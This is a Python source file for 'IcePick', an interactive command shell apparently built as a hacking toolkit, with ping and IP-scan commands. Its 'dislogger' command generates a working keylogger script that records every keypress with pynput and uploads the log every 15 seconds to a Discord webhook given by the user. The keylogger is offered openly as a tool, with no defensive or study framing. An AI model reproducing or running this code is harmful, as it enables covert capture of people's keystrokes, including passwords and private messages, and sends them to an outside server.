import cmd
import os
import ping3
import psutil
import argparse
import textwrap
import subprocess
from discord_webhook import DiscordWebhook
from icepick_opt import scan
from colors import *


class IcePick(cmd.Cmd):
    def __init__(self, header):
        super().__init__()
        self.intro = "Welcome to IcePick shell! Type ? to list commands."
        self.prompt = cyan + "IcePick: " + nc + yellow + nc
        self.header = header
        
        if not os.path.exists("filegen"):
            os.makedirs("filegen")

    def do_ping(self, args):
        """ping command: Perform a custom ping command."""
        try:
            parser = argparse.ArgumentParser(prog="ping", description="Perform a ping command.")
            parser.add_argument("-l", "--location", required=True, help="IP:PORT to ping.")
            parsed_args = parser.parse_args(args.split())

            ip, port = parsed_args.location.split(":")
            print(f"Pinging {ip}:{port}...")

            response_time = ping3.ping(ip, timeout=2)

            if response_time is not None:
                print(f"Response time: {response_time} ms")
            else:
                print("Ping failed")
        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))

    def do_scan(self, args):
        """scan command: Scan an IP address for information."""
        try:
            parser = argparse.ArgumentParser(prog="scan", description="Scan an IP address for information.")
            parser.add_argument("-i", "--ip", required=True, help="IP address to scan.")
            parsed_args = parser.parse_args(args.split())

            ip = parsed_args.ip
            scan(ip)
        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))
            
    def create_log(self, webhook_url):
        script = textwrap.dedent(f"""
            import pynput
            from discord_webhook import DiscordWebhook
            import time

            def log_key(key):
                with open("filegen/key_log.txt", "a") as f:
                    f.write(str(key))

            log_file = pynput.keyboard.Listener(on_press=log_key)
            log_file.start()

            webhook = DiscordWebhook(url="{webhook_url}")

            while True:
                try:
                    with open("filegen/key_log.txt", "r") as f:
                        log_text = f.read().strip()
                except FileNotFoundError:
                    log_text = ""
                    with open("filegen/key_log.txt", "w") as f:
                        pass

                if log_text:
                    webhook.add_file(file=open("filegen/key_log.txt", "rb"), filename="key_log.txt")

                    response = webhook.execute()
                    status_code = response.status_code

                    if status_code == 200:
                        print("File was successfully sent to the webhook.")

                time.sleep(15)

        """).strip()

        formatted_script = textwrap.indent(script, "")

        with open("filegen/logger.py", "w") as file:
            file.write(formatted_script)

        return os.path.abspath("filegen/logger.py")

    def do_dislogger(self, args):
        """dislogger command: Create a keylogger script with Discord webhook URL."""
        try:
            parser = argparse.ArgumentParser(prog="dislogger", description="Create the logger.py file.")
            parser.add_argument("-w", "--webhook", help="Discord webhook URL.")
            parser.add_argument("-l", "--locate", action="store_true", help="Print the location of the logger.py file.")
            parsed_args = parser.parse_args(args.split())

            webhook_url = parsed_args.webhook
            logger_file = self.create_log(webhook_url)

            if parsed_args.locate:
                print("Location:", logger_file)

        except SystemExit:
            pass
        except Exception as e:
            print("Error occurred:", str(e))

    def do_exit(self, arg):
        """exit command: Exit IcePick shell."""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.header()
        return True
    
    def postcmd(self, stop, line):
        if line.strip() == "exit":
            os.system('cls')
            return True
        return stop
    def cmdloop(self, intro=None):
        while True:
            try:
                super().cmdloop(intro="")
                break
            except KeyboardInterrupt:
                print("KeyboardInterrupt")
    def log_key(self, key):
        with open("key_log.txt", "a") as f:
            f.write(str(key))
from icepick import choose_option
